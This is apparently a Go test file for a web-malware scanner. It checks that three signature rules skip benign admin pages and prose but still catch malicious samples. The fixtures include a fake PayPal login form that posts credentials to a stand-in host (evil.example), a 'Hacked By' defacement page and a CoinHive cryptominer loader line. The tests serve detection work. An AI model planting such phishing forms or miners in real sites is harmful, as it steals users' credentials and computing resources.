package signatures

import "testing"

// YAML-engine mirror of the phishing/deface/miner FP-flood fix. The YAML engine
// scans .html/.htm/.php, so the .php false positive is the cookie-notice
// welcome.php admin page (PayPal brand + a password setting + an SPA form).
// office365 keeps its stronger DOM-ID design and is not retested here.

func TestFPFlood_YML_PhishingPaypal_AdminPage(t *testing.T) {
	s := loadRepoScanner(t)
	adminPage := []byte("<div class=\"cn-welcome\"><a href=\"https://paypal.com/donate\">Support us via PayPal</a>\n<form method=\"post\" action=\"payment\" data-action=\"save\"><input type=\"password\" name=\"api_secret\"></form></div>")
	if hasRule(s.ScanContent(adminPage, ".php"), "phishing_paypal") {
		t.Error("phishing_paypal FP: matched a plugin admin settings page")
	}
	mal := []byte("<h2>Log in to your PayPal account</h2><form action=\"https://evil.example/collect.php\" method=\"post\"><input type=\"email\"><input type=\"password\"></form>")
	if !hasRule(s.ScanContent(mal, ".php"), "phishing_paypal") {
		t.Error("phishing_paypal regression: real PayPal phishing page not detected")
	}
}

func TestFPFlood_YML_DefaceHackedBy_Prose(t *testing.T) {
	s := loadRepoScanner(t)
	prose := []byte("<p>Web Application Firewall stops you from getting hacked by identifying malicious traffic.</p>")
	if hasRule(s.ScanContent(prose, ".php"), "deface_hacked_by") {
		t.Error("deface_hacked_by FP: matched prose in body text")
	}
	mal := []byte("<html><title>Hacked By xShadow</title><h1>Hacked By xShadow</h1></html>")
	if !hasRule(s.ScanContent(mal, ".html"), "deface_hacked_by") {
		t.Error("deface_hacked_by regression: real defacement heading not detected")
	}
}

func TestFPFlood_YML_MinerCoinhive_LoaderStructure(t *testing.T) {
	s := loadRepoScanner(t)
	botList := []byte("<?php return array('bots'=>array('Googlebot','CoinHive','AhrefsBot'));")
	if hasRule(s.ScanContent(botList, ".php"), "miner_coinhive_js") {
		t.Error("miner_coinhive FP: matched a bot user-agent list")
	}
	mal := []byte("var m=new CoinHive.Anonymous('KEY'); m.start();")
	if !hasRule(s.ScanContent(mal, ".js"), "miner_coinhive_js") {
		t.Error("miner_coinhive regression: real CoinHive loader not detected")
	}
}
